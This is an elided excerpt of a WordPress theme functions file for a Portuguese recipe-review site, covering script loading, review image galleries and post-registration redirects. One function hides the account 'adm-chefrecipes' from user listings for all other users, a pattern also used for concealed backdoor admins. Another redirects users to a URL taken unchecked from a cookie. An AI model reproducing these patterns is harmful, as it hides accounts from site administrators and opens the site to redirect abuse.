...
add_action( 'template_redirect', function(){
    ...
    if( strpos( $current_page, '/ingredientes/' ) !== false ){
...
18/05/2023 - add is_single para /reviews/983473
*/
function add_estilos_e_scripts() { 
	...
	// Insere scripts /  styles apenas da primeira pagina
	 if ( is_search() or is_front_page() or is_page('sobre') or is_page('contato') or is_page('password-reset') or is_page('gastronomia') or is_page('login') or is_category() or is_tax('recipe_feature') or is_single() or is_tax('recipe_cuisine') or is_tax('recipe_ingredient') or is_tag() ) {
		wp_enqueue_script( 'toplikes-widget-script', get_stylesheet_directory_uri() . '/assets/js/toplikes-widget.js', array ( 'jquery' ), 1.1, true );
		wp_enqueue_style( 'toplikes-widget',  get_stylesheet_directory_uri() . '/assets/css/toplikes-widget.css' );
	} 
  }
...
// [upo-author-posts-count [wpv-user field="user_id"]
...
//FIX upload front end gallery images for reviews subscribers
function acf_set_featured_image( $value, $post_id, $field  ){

    if($value != ''){
        //Add the value which is the image ID to the _thumbnail_id meta data for the current post
        add_post_meta($post_id, '_thumbnail_id', $value[0]);
		// criar um metacampo com o array das imagens da review
		add_post_meta($post_id, '_gallery_temp', $value);
    }
    return $value;
}

// acf/update_value/name={$field_name} - filter for a specific field based on it's name
add_filter('acf/update_value/name=review_images', 'acf_set_featured_image', 10, 3);


// Ação que salva na reviews os arrays em  _gallery_temp no campo ACF review_images apos enviar e salvar a Review
add_action('acf/save_post', function ($post_id) {
    $value = get_field('_gallery_temp', $post_id);
    if ($value) {
		if (!is_array($value)){
			$gallery_arr = maybe_unserialize( $value );
			update_post_meta($post_id, 'review_images', $gallery_arr);
		}
		else {
			update_post_meta($post_id, 'review_images', $value);
		}
        delete_post_meta($post_id, '_gallery_temp');
    } 
}, 11);
...
function um_121721_change_registration_role( $user_id ){
	...
	//UM()->user()->is_approved( $user_id );
	//UM()->user()->auto_login( $user_id );
	$_SESSION['urlAtual'] = get_permalink(); 
...
add_filter('um_after_email_confirmation_redirect', 'hsseq4u_redirection_url', 10, 3);
 ...
 function hsseq4u_redirection_url() {
	 ...
	 if(!empty($url_before_registration)) {
		...
		if( !empty( $previous_page_url ) ){
			setcookie('um_previous_page', null, strtotime('-1 day'));
			$url_before_registration = $previous_page_url;
			return $url_before_registration;
		}
...
function my_activate_url( $url ) {
    // your code here
	$url = $_COOKIE['um_previous_page'];
	$url = $url . '/#osetinRecipeReviews';
return $url;
}
...
function site_pre_user_query($user_search) {
	...
	if ($username == 'adm-chefrecipes') {
	}
 
	else {
	global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'adm-chefrecipes'",$user_search->query_where);
  }
}
...
// Adiciona uma tab customizada das reviews do assinantes no ultimate member
require_once(get_theme_file_path() . "/ultimate-member/custom_profile_tabs.php");
include('includes/widget-count-recipes.php'); 
